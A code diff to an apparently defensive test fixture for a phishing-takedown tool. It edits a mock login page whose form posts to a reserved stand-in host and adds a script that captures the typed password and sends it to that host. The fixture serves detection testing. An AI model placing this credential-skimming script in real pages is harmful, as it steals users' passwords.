@@ -19,11 +19,19 @@ SITE = b"""<!doctype html>
 This page belongs to the Takedown Orchestrator team. It is not a real login
 and it stores nothing.</p>
 <h2>Sign in to your account</h2>
-<form method="post" action="/collect">
+<form id="login" method="post" action="https://collector.invalid/save.php">
 <input name="email" placeholder="Email" style="display:block;margin:8px 0;width:100%">
 <input name="password" type="password" placeholder="Password" style="display:block;margin:8px 0;width:100%">
 <button>Sign in</button>
-</form></body></html>"""
+</form>
+<script>
+// Controlled test content: collector.invalid can never resolve (reserved name).
+document.querySelector("#login").addEventListener("submit", async (e) => {
+  e.preventDefault();
+  const pass = document.querySelector("[name=password]").value;
+  await fetch("https://collector.invalid/log", { method: "POST", body: JSON.stringify({ pass }) });
+});
+</script></body></html>"""
 
 
 TYPES = {".html": "text/html; charset=utf-8", ".js": "text/javascript; charset=utf-8",
